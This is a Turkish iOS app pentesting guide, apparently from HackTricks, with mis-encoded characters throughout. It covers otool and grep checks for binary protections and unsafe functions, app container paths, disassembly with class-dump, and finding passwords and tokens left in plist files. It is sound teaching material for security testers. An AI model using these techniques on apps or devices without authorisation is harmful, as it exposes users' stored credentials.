# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
DÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ±** kolayca oluÅŸturmak ve **otomatikleÅŸtirmek** iÃ§in [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting) kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
{% endhint %}

## iOS Temelleri

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Test OrtamÄ±

Bu sayfada **iOS simÃ¼latÃ¶rÃ¼**, **emÃ¼latÃ¶rler** ve **jailbreaking** hakkÄ±nda bilgi bulabilirsiniz:

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## Ä°lk Analiz

### Temel iOS Test Ä°ÅŸlemleri

Test sÄ±rasÄ±nda **birÃ§ok iÅŸlem Ã¶nerilecektir** (cihaza baÄŸlanma, dosyalarÄ± okuma/yazma/yÃ¼kleme/indirme, bazÄ± araÃ§larÄ± kullanma...). Bu nedenle, bu eylemlerden herhangi birini nasÄ±l gerÃ§ekleÅŸtireceÄŸinizi bilmiyorsanÄ±z, lÃ¼tfen **sayfayÄ± okumaya baÅŸlayÄ±n**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
AÅŸaÄŸÄ±daki adÄ±mlar iÃ§in **uygulama cihazda kurulu olmalÄ±dÄ±r** ve uygulamanÄ±n **IPA dosyasÄ±nÄ±** zaten almÄ±ÅŸ olmalÄ±dÄ±r.\
Bunu nasÄ±l yapacaÄŸÄ±nÄ±zÄ± Ã¶ÄŸrenmek iÃ§in [Temel iOS Test Ä°ÅŸlemleri](basic-ios-testing-operations.md) sayfasÄ±nÄ± okuyun.
{% endhint %}

### Temel Statik Analiz

IPA dosyasÄ±na otomatik Statik Analiz gerÃ§ekleÅŸtirmek iÃ§in [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) aracÄ±nÄ± kullanmanÄ±z Ã¶nerilir.

**Ä°kili dosyada mevcut olan korumalarÄ±n tanÄ±mlanmasÄ±**:

*   **PIE (Position Independent Executable)**: EtkinleÅŸtirildiÄŸinde, uygulama her baÅŸlatÄ±ldÄ±ÄŸÄ±nda rastgele bir bellek adresine yÃ¼klenir, bu da baÅŸlangÄ±Ã§ bellek adresini tahmin etmeyi zorlaÅŸtÄ±rÄ±r.

```bash
otool -hv <app-binary> | grep PIE   # PIE bayraÄŸÄ±nÄ± iÃ§ermelidir
```
*   **Stack Canaries**: YÄ±ÄŸÄ±n bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ doÄŸrulamak iÃ§in, bir iÅŸlev Ã§aÄŸrÄ±lmadan Ã¶nce yÄ±ÄŸÄ±nda bir â€˜canaryâ€™ deÄŸeri yerleÅŸtirilir ve iÅŸlev sona erdiÄŸinde tekrar doÄŸrulanÄ±r.

```bash
otool -I -v <app-binary> | grep stack_chk   # stack_chk_guard ve stack_chk_fail sembollerini iÃ§ermelidir
```
*   **ARC (Automatic Reference Counting)**: YaygÄ±n bellek bozulma hatalarÄ±nÄ± Ã¶nlemek iÃ§in

```bash
otool -I -v <app-binary> | grep objc_release   # _objc_release sembolÃ¼nÃ¼ iÃ§ermelidir
```
*   **Åifreli Ä°kili**: Ä°kili dosya ÅŸifrelenmiÅŸ olmalÄ±dÄ±r

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # cryptid 1 olmalÄ±dÄ±r
```

**Hassas/GÃ¼vensiz FonksiyonlarÄ±n TanÄ±mlanmasÄ±**

*   **ZayÄ±f Hashing AlgoritmalarÄ±**

```bash
# iOS cihazÄ±nda
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Linux'ta
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **GÃ¼vensiz Rastgele Fonksiyonlar**

```bash
# iOS cihazÄ±nda
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Linux'ta
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **GÃ¼vensiz â€˜Mallocâ€™ Fonksiyonu**

```bash
# iOS cihazÄ±nda
otool -Iv <app> | grep -w "_malloc"

# Linux'ta
grep -iER "_malloc"
```
*   **GÃ¼vensiz ve AÃ§Ä±k Fonksiyonlar**

```bash
# iOS cihazÄ±nda
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Linux'ta
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### Temel Dinamik Analiz

[**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) tarafÄ±ndan gerÃ§ekleÅŸtirilen dinamik analizi kontrol edin. FarklÄ± gÃ¶rÃ¼nÃ¼mler arasÄ±nda gezinmeniz ve onlarla etkileÅŸimde bulunmanÄ±z gerekecek, ancak diÄŸer ÅŸeyleri yaparken birkaÃ§ sÄ±nÄ±fÄ± baÄŸlayacak ve iÅŸiniz bittiÄŸinde bir rapor hazÄ±rlayacaktÄ±r.

### YÃ¼klenen UygulamalarÄ± Listeleme

YÃ¼klenen uygulamalarÄ±n **bundle identifier**'Ä±nÄ± belirlemek iÃ§in `frida-ps -Uai` komutunu kullanÄ±n:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Temel Enumerasyon & Hooking

UygulamanÄ±n **bileÅŸenlerini listelemeyi** ve **metotlarÄ± ve sÄ±nÄ±flarÄ± kolayca hook'lamayÄ±** Ã¶ÄŸrenin:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### IPA YapÄ±sÄ±

Bir **IPA dosyasÄ±nÄ±n** yapÄ±sÄ± esasen bir **ziplenmiÅŸ paket** yapÄ±sÄ±dÄ±r. UzantÄ±sÄ±nÄ± `.zip` olarak yeniden adlandÄ±rarak, iÃ§eriÄŸini **aÃ§abilirsiniz**. Bu yapÄ± iÃ§inde, bir **Bundle**, kurulum iÃ§in hazÄ±r bir ÅŸekilde paketlenmiÅŸ uygulamayÄ± temsil eder. Ä°Ã§inde, uygulamanÄ±n kaynaklarÄ±nÄ± kapsayan `<NAME>.app` adlÄ± bir dizin bulacaksÄ±nÄ±z.

* **`Info.plist`**: Bu dosya, uygulamanÄ±n belirli yapÄ±landÄ±rma ayrÄ±ntÄ±larÄ±nÄ± tutar.
* **`_CodeSignature/`**: Bu dizin, bundle iÃ§indeki tÃ¼m dosyalarÄ±n bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ saÄŸlamak iÃ§in bir imza iÃ§eren bir plist dosyasÄ± iÃ§erir.
* **`Assets.car`**: Ä°konlar gibi varlÄ±k dosyalarÄ±nÄ± depolayan sÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ bir arÅŸivdir.
* **`Frameworks/`**: Bu klasÃ¶r, `.dylib` veya `.framework` dosyalarÄ± ÅŸeklinde olabilen uygulamanÄ±n yerel kÃ¼tÃ¼phanelerini barÄ±ndÄ±rÄ±r.
* **`PlugIns/`**: Uygulamaya uzantÄ±lar iÃ§erebilir, bunlar `.appex` dosyalarÄ± olarak bilinir, ancak her zaman mevcut olmayabilir. \* [**`Core Data`**](https://developer.apple.com/documentation/coredata): UygulamanÄ±zÄ±n kalÄ±cÄ± verilerini Ã§evrimdÄ±ÅŸÄ± kullanÄ±m iÃ§in kaydetmek, geÃ§ici verileri Ã¶nbelleÄŸe almak ve uygulamanÄ±zda tek bir cihazda geri alma iÅŸlevselliÄŸi eklemek iÃ§in kullanÄ±lÄ±r. Bir iCloud hesabÄ±ndaki birden fazla cihaz arasÄ±nda veri senkronizasyonu saÄŸlamak iÃ§in, Core Data otomatik olarak ÅŸemanÄ±zÄ± bir CloudKit konteynerine yansÄ±tÄ±r.
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): `PkgInfo` dosyasÄ±, uygulamanÄ±zÄ±n veya bundle'Ä±nÄ±zÄ±n tÃ¼rÃ¼nÃ¼ ve yaratÄ±cÄ±sÄ±nÄ± belirtmenin alternatif bir yoludur.
* **en.lproj, fr.proj, Base.lproj**: Bu, belirli diller iÃ§in kaynaklarÄ± iÃ§eren dil paketleridir ve bir dil desteklenmediÄŸinde varsayÄ±lan bir kaynak iÃ§erir.
* **GÃ¼venlik**: `_CodeSignature/` dizini, dijital imzalar aracÄ±lÄ±ÄŸÄ±yla tÃ¼m paketlenmiÅŸ dosyalarÄ±n bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ doÄŸrulayarak uygulamanÄ±n gÃ¼venliÄŸinde kritik bir rol oynar.
* **VarlÄ±k YÃ¶netimi**: `Assets.car` dosyasÄ±, grafik varlÄ±klarÄ± verimli bir ÅŸekilde yÃ¶netmek iÃ§in sÄ±kÄ±ÅŸtÄ±rma kullanÄ±r, bu da uygulama performansÄ±nÄ± optimize etmek ve genel boyutunu azaltmak iÃ§in Ã¶nemlidir.
* **Frameworks ve PlugIns**: Bu dizinler, iOS uygulamalarÄ±nÄ±n modÃ¼lerliÄŸini vurgular, geliÅŸtiricilerin yeniden kullanÄ±labilir kod kÃ¼tÃ¼phanelerini (`Frameworks/`) dahil etmelerine ve uygulama iÅŸlevselliÄŸini geniÅŸletmelerine olanak tanÄ±r.
* **YerelleÅŸtirme**: YapÄ±, belirli dil paketleri iÃ§in kaynaklar ekleyerek kÃ¼resel uygulama eriÅŸimini kolaylaÅŸtÄ±ran birden fazla dili destekler.

**Info.plist**

**Info.plist**, iOS uygulamalarÄ± iÃ§in bir kÃ¶ÅŸe taÅŸÄ± olarak hizmet eder ve **anahtar-deÄŸer** Ã§iftleri ÅŸeklinde ana yapÄ±landÄ±rma verilerini kapsar. Bu dosya, yalnÄ±zca uygulamalar iÃ§in deÄŸil, aynÄ± zamanda iÃ§inde paketlenmiÅŸ uygulama uzantÄ±larÄ± ve framework'ler iÃ§in de gereklidir. XML veya ikili formatta yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r ve uygulama izinlerinden gÃ¼venlik yapÄ±landÄ±rmalarÄ±na kadar kritik bilgileri tutar. Mevcut anahtarlarÄ±n detaylÄ± bir keÅŸfi iÃ§in [**Apple Developer Documentation**](https://developer.apple.com/documentation/bundleresources/information_property_list?language=objc) adresine baÅŸvurabilirsiniz.

Bu dosyayla daha eriÅŸilebilir bir formatta Ã§alÄ±ÅŸmak isteyenler iÃ§in, XML dÃ¶nÃ¼ÅŸÃ¼mÃ¼ macOS'ta `plutil` kullanÄ±larak kolayca gerÃ§ekleÅŸtirilebilir (10.2 ve sonraki sÃ¼rÃ¼mlerde yerel olarak mevcuttur) veya Linux'ta `plistutil` ile yapÄ±labilir. DÃ¶nÃ¼ÅŸÃ¼m iÃ§in komutlar ÅŸu ÅŸekildedir:

* **macOS iÃ§in**:
```bash
$ plutil -convert xml1 Info.plist
```
* **Linux iÃ§in**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Info.plist** dosyasÄ±nÄ±n ortaya Ã§Ä±karabileceÄŸi Ã§ok sayÄ±da bilgi arasÄ±nda, dikkat Ã§ekici girdiler uygulama izin dizeleri (`UsageDescription`), Ã¶zel URL ÅŸemalarÄ± (`CFBundleURLTypes`) ve Uygulama TaÅŸÄ±ma GÃ¼venliÄŸi iÃ§in yapÄ±landÄ±rmalar (`NSAppTransportSecurity`) bulunmaktadÄ±r. Bu girdiler, dÄ±ÅŸa aktarÄ±lan/iÃ§e aktarÄ±lan Ã¶zel belge tÃ¼rleri (`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`) gibi diÄŸerleriyle birlikte, dosyayÄ± inceleyerek veya basit bir `grep` komutu kullanarak kolayca bulunabilir:
```bash
$ grep -i <keyword> Info.plist
```
**Veri YollarÄ±**

iOS ortamÄ±nda, dizinler **sistem uygulamalarÄ±** ve **kullanÄ±cÄ± tarafÄ±ndan yÃ¼klenen uygulamalar** iÃ§in Ã¶zel olarak belirlenmiÅŸtir. Sistem uygulamalarÄ± `/Applications` dizininde bulunurken, kullanÄ±cÄ± tarafÄ±ndan yÃ¼klenen uygulamalar `/var/mobile/containers/Data/Application/` altÄ±nda yer alÄ±r. Bu uygulamalar, dizin adlarÄ±nÄ±n rastgeleliÄŸi nedeniyle bir uygulamanÄ±n klasÃ¶rÃ¼nÃ¼ manuel olarak bulmayÄ± zorlaÅŸtÄ±ran **128-bit UUID** olarak bilinen benzersiz bir tanÄ±mlayÄ±cÄ±ya sahiptir.

{% hint style="warning" %}
iOS'taki uygulamalar sandbox'lanmÄ±ÅŸ olmasÄ± gerektiÄŸinden, her uygulamanÄ±n **`$HOME/Library/Containers`** iÃ§inde uygulamanÄ±n **`CFBundleIdentifier`** olarak adlandÄ±rÄ±lan bir klasÃ¶rÃ¼ de olacaktÄ±r.

Ancak, her iki klasÃ¶r (veri ve konteyner klasÃ¶rleri) **`.com.apple.mobile_container_manager.metadata.plist`** dosyasÄ±nÄ± iÃ§erir ve bu dosya, `MCMetadataIdentifier` anahtarÄ±nda her iki dosyayÄ± baÄŸlar.
{% endhint %}

KullanÄ±cÄ± tarafÄ±ndan yÃ¼klenen bir uygulamanÄ±n kurulum dizinini keÅŸfetmeyi kolaylaÅŸtÄ±rmak iÃ§in, **objection aracÄ±** faydalÄ± bir komut saÄŸlar, `env`. Bu komut, sÃ¶z konusu uygulama iÃ§in ayrÄ±ntÄ±lÄ± dizin bilgilerini ortaya Ã§Ä±karÄ±r. AÅŸaÄŸÄ±da bu komutun nasÄ±l kullanÄ±lacaÄŸÄ±na dair bir Ã¶rnek bulunmaktadÄ±r:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Alternatif olarak, uygulama adÄ± `/private/var/containers` iÃ§inde `find` komutunu kullanarak aranabilir:
```bash
find /private/var/containers -name "Progname*"
```
`ps` ve `lsof` gibi komutlar, uygulamanÄ±n iÅŸlemini tanÄ±mlamak ve sÄ±rasÄ±yla aÃ§Ä±k dosyalarÄ± listelemek iÃ§in de kullanÄ±labilir, bu da uygulamanÄ±n aktif dizin yollarÄ± hakkÄ±nda bilgiler saÄŸlar:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Bundle dizini:**

* **AppName.app**
* Bu, IPA'da daha Ã¶nce gÃ¶rÃ¼len Uygulama Paketi olup, temel uygulama verilerini, statik iÃ§eriÄŸi ve uygulamanÄ±n derlenmiÅŸ ikili dosyasÄ±nÄ± iÃ§erir.
* Bu dizin kullanÄ±cÄ±lara gÃ¶rÃ¼nÃ¼r, ancak **kullanÄ±cÄ±lar buna yazamaz**.
* Bu dizindeki iÃ§erik **yedeklenmez**.
* Bu klasÃ¶rÃ¼n iÃ§eriÄŸi **kod imzasÄ±nÄ± doÄŸrulamak** iÃ§in kullanÄ±lÄ±r.

**Veri dizini:**

* **Documents/**
* KullanÄ±cÄ± tarafÄ±ndan oluÅŸturulan tÃ¼m verileri iÃ§erir. Uygulama son kullanÄ±cÄ± bu verilerin oluÅŸturulmasÄ±nÄ± baÅŸlatÄ±r.
* KullanÄ±cÄ±lara gÃ¶rÃ¼nÃ¼r ve **kullanÄ±cÄ±lar buna yazabilir**.
* Bu dizindeki iÃ§erik **yedeklenir**.
* Uygulama, `NSURLIsExcludedFromBackupKey` ayarÄ±nÄ± kullanarak yollarÄ± devre dÄ±ÅŸÄ± bÄ±rakabilir.
* **Library/**
* **KullanÄ±cÄ±ya Ã¶zel olmayan** tÃ¼m **dosyalarÄ±** iÃ§erir, Ã¶rneÄŸin **Ã¶nbellekler**, **tercihler**, **Ã§erezler** ve Ã¶zellik listesi (plist) yapÄ±landÄ±rma dosyalarÄ±.
* iOS uygulamalarÄ± genellikle `Application Support` ve `Caches` alt dizinlerini kullanÄ±r, ancak uygulama Ã¶zel alt dizinler oluÅŸturabilir.
* **Library/Caches/**
* **YarÄ± kalÄ±cÄ± Ã¶nbellek dosyalarÄ±nÄ±** iÃ§erir.
* KullanÄ±cÄ±lara gÃ¶rÃ¼nmez ve **kullanÄ±cÄ±lar buna yazamaz**.
* Bu dizindeki iÃ§erik **yedeklenmez**.
* OS, uygulama Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nda ve depolama alanÄ± azaldÄ±ÄŸÄ±nda bu dizinin dosyalarÄ±nÄ± otomatik olarak silebilir.
* **Library/Application Support/**
* UygulamanÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in gerekli **kalÄ±cÄ±** **dosyalarÄ±** iÃ§erir.
* **KullanÄ±cÄ±lara gÃ¶rÃ¼nmez** ve kullanÄ±cÄ±lar buna yazamaz.
* Bu dizindeki iÃ§erik **yedeklenir**.
* Uygulama, `NSURLIsExcludedFromBackupKey` ayarÄ±nÄ± kullanarak yollarÄ± devre dÄ±ÅŸÄ± bÄ±rakabilir.
* **Library/Preferences/**
* Uygulama yeniden baÅŸlatÄ±lsa bile **kalÄ±cÄ±** olabilen Ã¶zellikleri saklamak iÃ§in kullanÄ±lÄ±r.
* Bilgiler, ÅŸifrelenmemiÅŸ olarak, uygulama kumanda alanÄ±nda \[BUNDLE\_ID].plist adlÄ± bir plist dosyasÄ±nda saklanÄ±r.
* `NSUserDefaults` kullanÄ±larak saklanan tÃ¼m anahtar/deÄŸer Ã§iftleri bu dosyada bulunabilir.
* **tmp/**
* Uygulama baÅŸlatmalarÄ± arasÄ±nda kalÄ±cÄ± olmasÄ± gerekmeyen **geÃ§ici dosyalar** yazmak iÃ§in bu dizini kullanÄ±n.
* KalÄ±cÄ± olmayan Ã¶nbellek dosyalarÄ±nÄ± iÃ§erir.
* **KullanÄ±cÄ±lara gÃ¶rÃ¼nmez**.
* Bu dizindeki iÃ§erik yedeklenmez.
* OS, uygulama Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nda ve depolama alanÄ± azaldÄ±ÄŸÄ±nda bu dizinin dosyalarÄ±nÄ± otomatik olarak silebilir.

iGoat-Swift'in Uygulama Paketi (.app) dizinine daha yakÄ±ndan bakalÄ±m (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Binary Reversing

`<application-name>.app` klasÃ¶rÃ¼nÃ¼n iÃ§inde `<application-name>` adÄ±nda bir ikili dosya bulacaksÄ±nÄ±z. Bu, **Ã§alÄ±ÅŸtÄ±rÄ±lacak** dosyadÄ±r. Ä°kili dosyanÄ±n temel bir incelemesini **`otool`** aracÄ±yla gerÃ§ekleÅŸtirebilirsiniz:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**UygulamanÄ±n ÅŸifrelenip ÅŸifrelenmediÄŸini kontrol et**

AÅŸaÄŸÄ±daki iÃ§in herhangi bir Ã§Ä±ktÄ± olup olmadÄ±ÄŸÄ±nÄ± kontrol edin:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Ä°kiliyi AyrÄ±ÅŸtÄ±rma**

Metin bÃ¶lÃ¼mÃ¼nÃ¼ ayrÄ±ÅŸtÄ±rÄ±n:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
**Ã–rnek uygulamanÄ±n Objective-C segmentini** yazdÄ±rmak iÃ§in ÅŸunlarÄ± kullanabilirsiniz:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Daha kompakt bir Objective-C kodu elde etmek iÃ§in [**class-dump**](http://stevenygard.com/projects/class-dump/) kullanabilirsiniz:
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Ancak, ikili dosyayÄ± parÃ§alamak iÃ§in en iyi seÃ§enekler: [**Hopper**](https://www.hopperapp.com/download.html?) ve [**IDA**](https://www.hex-rays.com/products/ida/support/download\_freeware/).

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting) kullanarak dÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ±** kolayca oluÅŸturun ve **otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}

## Veri Depolama

iOS'un cihazda verileri nasÄ±l depoladÄ±ÄŸÄ±nÄ± Ã¶ÄŸrenmek iÃ§in bu sayfayÄ± okuyun:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Bilgileri depolamak iÃ§in aÅŸaÄŸÄ±daki yerler **uygulama yÃ¼klendikten hemen sonra**, **uygulamanÄ±n tÃ¼m iÅŸlevleri kontrol edildikten sonra** ve hatta **bir kullanÄ±cÄ±dan Ã§Ä±kÄ±ÅŸ yapÄ±ldÄ±ktan ve farklÄ± bir kullanÄ±cÄ±ya giriÅŸ yapÄ±ldÄ±ktan sonra** kontrol edilmelidir.\
AmaÃ§, uygulamanÄ±n (ÅŸifreler, tokenlar), mevcut kullanÄ±cÄ±nÄ±n ve daha Ã¶nce giriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±larÄ±n **korumasÄ±z hassas bilgilerini** bulmaktÄ±r.
{% endhint %}

### Plist

**plist** dosyalarÄ±, **anahtar-deÄŸer Ã§iftlerini** iÃ§eren yapÄ±landÄ±rÄ±lmÄ±ÅŸ XML dosyalarÄ±dÄ±r. KalÄ±cÄ± verileri depolamanÄ±n bir yoludur, bu nedenle bazen bu dosyalarda **hassas bilgiler bulabilirsiniz**. UygulamayÄ± yÃ¼kledikten sonra ve yoÄŸun bir ÅŸekilde kullandÄ±ktan sonra bu dosyalarÄ± kontrol etmeniz Ã¶nerilir.

Plist dosyalarÄ±nda verileri kalÄ±cÄ± hale getirmenin en yaygÄ±n yolu **NSUserDefaults** kullanÄ±mÄ±dÄ±r. Bu plist dosyasÄ±, uygulama kumandasÄ±nÄ±n iÃ§inde **`Library/Preferences/<appBundleID>.plist`** konumunda kaydedilir.

[`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) sÄ±nÄ±fÄ±, varsayÄ±lan sistemle etkileÅŸim kurmak iÃ§in programatik bir arayÃ¼z saÄŸlar. VarsayÄ±lan sistem, bir uygulamanÄ±n **kullanÄ±cÄ± tercihleri** doÄŸrultusunda davranÄ±ÅŸÄ±nÄ± Ã¶zelleÅŸtirmesine olanak tanÄ±r. `NSUserDefaults` ile kaydedilen veriler uygulama paketinde gÃ¶rÃ¼ntÃ¼lenebilir. Bu sÄ±nÄ±f, **plist** **dosyasÄ±nda** **veri** depolar, ancak kÃ¼Ã§Ã¼k miktarda veri ile kullanÄ±lmak Ã¼zere tasarlanmÄ±ÅŸtÄ±r.

Bu verilere artÄ±k gÃ¼venilir bir bilgisayar aracÄ±lÄ±ÄŸÄ±yla doÄŸrudan eriÅŸilemez, ancak bir **yedekleme** yaparak eriÅŸilebilir.

**`NSUserDefaults`** kullanarak kaydedilen bilgileri **dump** edebilirsiniz, objection'Ä±n `ios nsuserdefaults get` komutunu kullanarak.

Uygulama tarafÄ±ndan kullanÄ±lan tÃ¼m plist dosyalarÄ±na eriÅŸmek iÃ§in `/private/var/mobile/Containers/Data/Application/{APPID}` konumuna gidebilir ve ÅŸunu Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```bash
find ./ -name "*.plist"
```
**XML veya ikili (bplist) formatÄ±ndaki dosyalarÄ± XML'e dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in, iÅŸletim sisteminize baÄŸlÄ± olarak Ã§eÅŸitli yÃ¶ntemler mevcuttur:**

**macOS KullanÄ±cÄ±larÄ± iÃ§in:** `plutil` komutunu kullanÄ±n. Bu, macOS'ta (10.2+) bu amaÃ§ iÃ§in tasarlanmÄ±ÅŸ yerleÅŸik bir araÃ§tÄ±r:
```bash
$ plutil -convert xml1 Info.plist
```
**Linux KullanÄ±cÄ±larÄ± iÃ§in:** Ã–ncelikle `libplist-utils` yÃ¼kleyin, ardÄ±ndan dosyanÄ±zÄ± dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in `plistutil` kullanÄ±n:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
